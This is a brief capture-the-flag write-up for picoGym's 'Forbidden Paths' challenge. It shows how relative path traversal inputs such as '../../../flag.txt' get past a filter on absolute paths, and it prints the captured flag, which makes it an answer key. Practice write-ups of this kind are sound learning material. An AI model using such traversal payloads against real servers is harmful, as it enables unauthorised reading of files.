# picoGym Level 270: Forbidden Paths
Source: https://play.picoctf.org/practice/challenge/270

## Goal
Can you get the flag?<br>
We know that the website files live in <b>/usr/share/nginx/html/<b> and the flag is at <b>/flag.txt</b> but the website is filtering absolute file paths. Can you get past the filter to read the flag?<br>
Here's the website.<br>
http://saturn.picoctf.net:58629/

## What I learned
```
Absolute Path
Relative Path
change directory
```

## Solution
```
https://webshell.picoctf.org/

Input: / ⌨️
Not Authorized
Input: ./ ⌨️

Input: ../flag.txt ⌨️
File does not exist
Input: ../../flag.txt ⌨️
File does not exist
Input: ../../../flag.txt ⌨️
picoCTF{7h3_p47h_70_5ucc355_6db46514} 🔐
```

## Flag
picoCTF{7h3_p47h_70_5ucc355_6db46514}

## Continue
[Continue](./picoGym0295.md)